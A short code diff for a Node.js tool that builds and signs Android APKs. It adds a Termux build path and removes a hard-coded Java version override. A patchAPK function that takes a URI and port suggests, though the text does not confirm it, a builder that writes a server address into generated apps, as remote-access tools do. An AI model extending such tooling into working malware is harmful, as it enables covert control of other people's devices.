@@ -17,7 +17,6 @@ function javaversion(callback) {
         let openJDKIndex = output.indexOf('openjdk version');
         let javaVersion = (javaIndex !== -1) ? output.substring(javaIndex, (javaIndex + 27)) : "";
         let openJDKVersion = (openJDKIndex !== -1) ? output.substring(openJDKIndex, (openJDKIndex + 27)) : "";
-	openJDKVersion = "1.8.0";
         if (javaVersion !== "" || openJDKVersion !== "") {
             if (javaVersion.includes("1.8.0") || openJDKVersion.includes("1.8.0")) {
                 spawn.removeAllListeners();
@@ -40,6 +39,18 @@ function patchAPK(URI, PORT, cb) {
 }
 
 function buildAPK(cb) {
+
+    if (fs.existsSync(CONST.termux)) {
+        cp.exec(CONST.termuxBuildCommand,(error,stdout,stderr) => {
+            if (error) return cb('Build Command Failed - ' + error.message);
+            else cp.exec(CONST.termuxSignCommand, (error, stdout, stderr) => {
+                if(error) return  cb('Sign command Failed - ' + error.message);
+                else return cb(false);
+            });
+        });
+        return;
+    }
+
     javaversion(function (err, version) {
         if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
             if (error) return cb('Build Command Failed - ' + error.message);
